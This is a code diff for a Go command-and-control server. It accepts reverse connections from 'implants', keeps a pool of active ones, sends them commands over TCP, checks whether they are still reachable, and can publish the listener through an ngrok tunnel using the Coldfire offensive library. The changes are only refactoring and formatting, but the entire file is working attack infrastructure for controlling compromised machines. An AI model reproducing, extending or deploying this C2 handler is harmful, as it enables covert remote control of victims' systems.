@@ -4,35 +4,22 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"net/http"
 	"os"
 	"strconv"
 	"strings"
 	"time"
-	"io/ioutil"
-	"net/http"
-
 
 	"github.com/akamensky/argparse"
-	"github.com/savaki/jq"
-	"github.com/olekukonko/tablewriter"
 	"github.com/atotto/clipboard"
 	"github.com/c-bata/go-prompt"
 	"github.com/common-nighthawk/go-figure"
 	"github.com/fatih/color"
-	. "github.com/redcode-labs/Coldfire"
+	tw "github.com/olekukonko/tablewriter"
+	cf "github.com/redcode-labs/Coldfire"
+	"github.com/savaki/jq"
 	"github.com/taion809/haikunator"
 )
-
-var red = color.New(color.FgRed).SprintFunc()
-var green = color.New(color.FgGreen).SprintFunc()
-var cyan = color.New(color.FgCyan).SprintFunc()
-var bold = color.New(color.Bold).SprintFunc()
-var yellow = color.New(color.FgYellow).SprintFunc()
-var magenta = color.New(color.FgMagenta).SprintFunc()
-
-var implants []*Implant
-var active_ids []int
-var base_id = 0
 
 type Implant struct {
 	name string
@@ -41,6 +28,19 @@ type Implant struct {
 	ip   string
 	conn net.Conn
 }
+
+var (
+	red     = color.New(color.FgRed).SprintFunc()
+	green   = color.New(color.FgGreen).SprintFunc()
+	cyan    = color.New(color.FgCyan).SprintFunc()
+	bold    = color.New(color.Bold).SprintFunc()
+	yellow  = color.New(color.FgYellow).SprintFunc()
+	magenta = color.New(color.FgMagenta).SprintFunc()
+)
+
+var implants []*Implant
+var active_ids []int
+var base_id = 0
 
 func f(s string, arg ...interface{}) string {
 	return fmt.Sprintf(s, arg...)
@@ -106,11 +106,11 @@ func update_prompt_prefix() (string, bool) {
 
 func SendData(data string) {
 	for _, implant := range implants {
-		if Contains(active_ids, implant.id) {
+		if cf.Contains(active_ids, implant.id) {
 			_, err := io.WriteString(implant.conn, data+"\n")
 			if err != nil {
 				p()
-				PrintError(f("Unable to send data to ID:%d: %s", implant.id, red(err.Error())))
+				cf.PrintError(f("Unable to send data to ID:%d: %s", implant.id, red(err.Error())))
 				p()
 			}
 		}
@@ -167,10 +167,10 @@ func StartCommandPrompt() {
 			word := ""
 			remove := false
 			interact_all := false
-			if ContainsAny("*", elements) {
+			if cf.ContainsAny("*", elements) {
 				interact_all = true
 			}
-			if ContainsAny("-r", elements) {
+			if cf.ContainsAny("-r", elements) {
 				remove = true
 			}
 			if l == 1 {
@@ -182,22 +182,22 @@ func StartCommandPrompt() {
 				p()
 			} else {
 				ids := elements[1:]
-				ids = RemoveStr(ids, "*")
-				ids = RemoveStr(ids, "-r")
+				ids = cf.RemoveStr(ids, "*")
+				ids = cf.RemoveStr(ids, "-r")
 				if remove {
 					word = f("%d", len(ids))
 					if interact_all {
 						word = "all"
 					}
 					for _, id := range ids {
-						i := StrToInt(id)
-						active_ids = RemoveInt(active_ids, i)
+						i := cf.StrToInt(id)
+						active_ids = cf.RemoveInt(active_ids, i)
 					}
 					if interact_all {
 						active_ids = []int{}
 					}
 					p()
-					PrintInfo(f("Removed %s implants from active pool", red(word)))
+					cf.PrintInfo(f("Removed %s implants from active pool", red(word)))
 					p()
 				} else {
 					active_ids = []int{}
@@ -210,14 +210,14 @@ func StartCommandPrompt() {
 						ids = []string{}
 					}
 					for _, id := range ids {
-						i := StrToInt(id)
+						i := cf.StrToInt(id)
 						active_ids = append(active_ids, i)
 					}
 					p()
-					PrintInfo(f("Added %s agents to active pool", green(word)))
+					cf.PrintInfo(f("Added %s agents to active pool", green(word)))
 					p()
 				}
-				active_ids = RemoveDuplicatesInt(active_ids)
+				active_ids = cf.RemoveDuplicatesInt(active_ids)
 			}
 		case "list":
 			parser := argparse.NewParser("list", "Show available implants") //, usage_prologue)
@@ -225,54 +225,54 @@ func StartCommandPrompt() {
 			err := parser.Parse(elements)
 			if err != nil {
 				p()
-				PrintError(parser.Usage(err))
+				cf.PrintError(parser.Usage(err))
 				p()
-			} else if ! ContainsAny(cmd, []string{"-h"}) {
+			} else if !cf.ContainsAny(cmd, []string{"-h"}) {
 				if len(implants) != 0 {
 					p()
-					PrintInfo(bold(green(len(implants))) + " implants connected")
+					cf.PrintInfo(bold(green(len(implants))) + " implants connected")
 					p()
 					sep := "=================================================="
 					if *vertical {
 						fmt.Println(sep)
 					}
-					table := tablewriter.NewWriter(os.Stdout)
-					table.SetHeader([]string{"ID", "STATUS", "NAME", "TIME", "IP"})
-					table.SetCenterSeparator("|")
-					table.SetRowSeparator("-")
-					table.SetAlignment(tablewriter.ALIGN_CENTER)
+					tb := tw.NewWriter(os.Stdout)
+					tb.SetHeader([]string{"ID", "STATUS", "NAME", "TIME", "IP"})
+					tb.SetCenterSeparator("|")
+					tb.SetRowSeparator("-")
+					tb.SetAlignment(tw.ALIGN_CENTER)
 					for _, implant := range implants {
 						status := red(bold("(x)"))
-						if Contains(active_ids, implant.id) {
+						if cf.Contains(active_ids, implant.id) {
 							status = green(bold("(+)"))
 						}
 						if implant.id != -1 {
 							if *vertical {
-								fmt.Println("ID     -> " + cyan(IntToStr(implant.id)))
+								fmt.Println("ID     -> " + cyan(cf.IntToStr(implant.id)))
 								fmt.Println("NAME   -> " + red(implant.name))
 								fmt.Println("STATUS -> " + status)
 								fmt.Println("TIME   -> " + implant.time)
 								fmt.Println("IP     -> " + implant.ip)
 								fmt.Println(sep)
 							} else {
-								data := [][]string{[]string{cyan(implant.id), status, magenta(implant.name), implant.time, implant.ip}}
+								data := [][]string{{cyan(implant.id), status, magenta(implant.name), implant.time, implant.ip}}
 								for v := range data {
-									table.Append(data[v])
+									tb.Append(data[v])
 								}
 							}
 						}
 					}
-					table.Render()
+					tb.Render()
 					p()
 				} else {
 					p()
-					PrintError("No implants connected")
+					cf.PrintError("No implants connected")
 					p()
 				}
 			}
 		case "exit":
-			PrintInfo("Exiting...")
-			CmdBlind("pkill -9 ngrok")
+			cf.PrintInfo("Exiting...")
+			cf.CmdBlind("pkill -9 ngrok")
 			os.Exit(0)
 		case "check":
 			parser := argparse.NewParser("check", "Check connectivity of active hosts") //, usage_prologue)
@@ -282,52 +282,52 @@ func StartCommandPrompt() {
 			err := parser.Parse(elements)
 			if err != nil {
 				p()
-				PrintError(err.Error())
+				cf.PrintError(err.Error())
 				p()
-			} else if !ContainsAny(cmd, []string{"-h"}) {
+			} else if !cf.ContainsAny(cmd, []string{"-h"}) {
 				header := []string{"--ID--", "--NAME--", "--STATUS--"}
 				data := [][]string{}
 				num_errors := 0
 				if len(implants) != 0 {
 					for _, implant := range implants {
 						status := ""
-						for i := 0; i < *num; i++{
+						for i := 0; i < *num; i++ {
 							err := SendDataConn(implant.conn, "echo aa > /dev/null")
-							if err != nil{
+							if err != nil {
 								num_errors += 1
 							}
-						} 
+						}
 						if num_errors != 0 {
-						//	print_info(f("Implant #%d (%s) is %s", implant.id, magenta(implant.name), red("UNREACHABLE")))
+							//	print_info(f("Implant #%d (%s) is %s", implant.id, magenta(implant.name), red("UNREACHABLE")))
 							status = red("UNREACHABLE")
 							SendDataConn(implant.conn, "exit:")
 							if *remove {
-								active_ids = RemoveInt(active_ids, implant.id)
+								active_ids = cf.RemoveInt(active_ids, implant.id)
 								implants = RemoveImplant(implants, implant)
 							}
 						} else {
 							status = green("CONNECTED")
 							//print_info(f("Implant #%d (%s) is %s", implant.id, magenta(implant.name), green("CONNECTED")))
 						}
-						data = append(data, []string{cyan(implant.id), 
-													magenta(implant.name), 
-													status})
+						data = append(data, []string{cyan(implant.id),
+							magenta(implant.name),
+							status})
 					}
-					table := tablewriter.NewWriter(os.Stdout)
-					table.SetHeader(header)
-					table.SetCenterSeparator("*")
-					table.SetRowSeparator("-")
-					table.SetAlignment(tablewriter.ALIGN_CENTER)
+					tb := tw.NewWriter(os.Stdout)
+					tb.SetHeader(header)
+					tb.SetCenterSeparator("*")
+					tb.SetRowSeparator("-")
+					tb.SetAlignment(tw.ALIGN_CENTER)
 					for v := range data {
-						table.Append(data[v])
+						tb.Append(data[v])
 					}
 					p()
-					PrintInfo(f("Checking connectivity of %d implants...", len(implants)))
-					table.Render()
+					cf.PrintInfo(f("Checking connectivity of %d implants...", len(implants)))
+					tb.Render()
 					p()
 				} else {
 					p()
-					PrintError("No implants connected")
+					cf.PrintError("No implants connected")
 					p()
 				}
 			}
@@ -340,18 +340,18 @@ func StartCommandPrompt() {
 func StartTunnel(port string) (string, string) {
 	//regions := []string{"us", "eu", "ap", "au", "sa", "jp", "in"}
 	//selected_region := RandomSelectStr(regions)
-	go CmdBlind("ngrok tcp "+port)
+	go cf.CmdBlind("ngrok tcp " + port)
 	time.Sleep(2 * time.Second)
 	local_url := "http://localhost:4040/api/tunnels"
 	resp, err := http.Get(local_url)
 	if err != nil {
-		PrintError("Cannot obtain tunnel's address -> "+err.Error())
+		cf.PrintError("Cannot obtain tunnel's address -> " + err.Error())
 		os.Exit(0)
 	}
 	defer resp.Body.Close()
-	json, err := ioutil.ReadAll(resp.Body)
+	json, err := io.ReadAll(resp.Body)
 	if err != nil {
-		PrintError("Cannot obtain tunnel's address -> "+err.Error())
+		cf.PrintError("Cannot obtain tunnel's address -> " + err.Error())
 		os.Exit(0)
 	}
 	jq_op_1, _ := jq.Parse(".tunnels")
@@ -364,10 +364,10 @@ func StartTunnel(port string) (string, string) {
 	main_url = strings.Replace(main_url, `tcp://`, "", -1)
 	tunnel_addr := strings.Split(main_url, ":")[0]
 	tunnel_port := strings.Split(main_url, ":")[1]
-	t_ip, err := DnsLookup(tunnel_addr)
+	t_ip, err := cf.DnsLookup(tunnel_addr)
 	tunnel_ip := t_ip[0]
 	if err != nil {
-		PrintError(F("Cannot perform DNS lookup for %s: %s", Red(tunnel_ip), err.Error()))
+		cf.PrintError(cf.F("Cannot perform DNS lookup for %s: %s", cf.Red(tunnel_ip), err.Error()))
 	}
 	return tunnel_ip, tunnel_port
 }
@@ -378,14 +378,14 @@ func StartServer(proto, port string) {
 	for {
 		connection, err := listener.Accept()
 		fmt.Println("")
-		ExitOnError(err)
+		cf.ExitOnError(err)
 		//fmt.Println("[*] Connection from: ", green(bold(conn.RemoteAddr())))
 		n := Haikunate()
 		dt := time.Now()
 		t := dt.Format("15:04")
 		addr := strings.Split(connection.RemoteAddr().String(), ":")[0]
 		p()
-		PrintGood(fmt.Sprintf("Received connection from: %s (%s)", green(bold(addr)), magenta(n)))
+		cf.PrintGood(fmt.Sprintf("Received connection from: %s (%s)", green(bold(addr)), magenta(n)))
 		p()
 		implant := &Implant{
 			conn: connection,
@@ -413,19 +413,19 @@ func main() {
 	var clip *bool = parser.Flag("c", "clip", &argparse.Options{Required: false, Help: "Copy listening C2 address to clipboard"})
 	var tunnel *bool = parser.Flag("t", "tunnel", &argparse.Options{Required: false, Help: "Expose C2 server using Ngrok tunnel"})
 	err := parser.Parse(os.Args)
-	ExitOnError(err)
-	c2_addr := GetLocalIp() + ":" + *port
-	if *tunnel{
+	cf.ExitOnError(err)
+	c2_addr := cf.GetLocalIp() + ":" + *port
+	if *tunnel {
 		t_addr, t_port := StartTunnel(*port)
 		c2_addr = t_addr + ":" + t_port
-		PrintInfo("Started tunnel")
+		cf.PrintInfo("Started tunnel")
 	}
 	p()
-	PrintInfo(F("Started reverse handler %s", cyan(bold("["+c2_addr+"]"))))
+	cf.PrintInfo(cf.F("Started reverse handler %s", cyan(bold("["+c2_addr+"]"))))
 	p()
 	if *clip {
 		clipboard.WriteAll(c2_addr)
-		PrintInfo("Copied server address to clipboard")
+		cf.PrintInfo("Copied server address to clipboard")
 		p()
 	}
 	StartServer("tcp", *port)
